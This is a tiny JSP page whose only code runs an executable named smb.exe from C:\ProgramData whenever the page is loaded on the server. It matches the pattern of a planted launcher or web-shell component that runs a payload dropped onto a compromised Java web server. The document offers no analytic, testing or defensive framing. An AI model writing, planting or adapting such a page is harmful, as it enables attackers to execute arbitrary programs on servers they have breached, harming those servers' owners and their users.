<%@ page import="java.io.*" %>

<% 
try { 
Process p = Runtime.getRuntime().exec("C:\\programdata\\smb.exe");
} 
catch(IOException e) {
e.printStackTrace();
}
%>
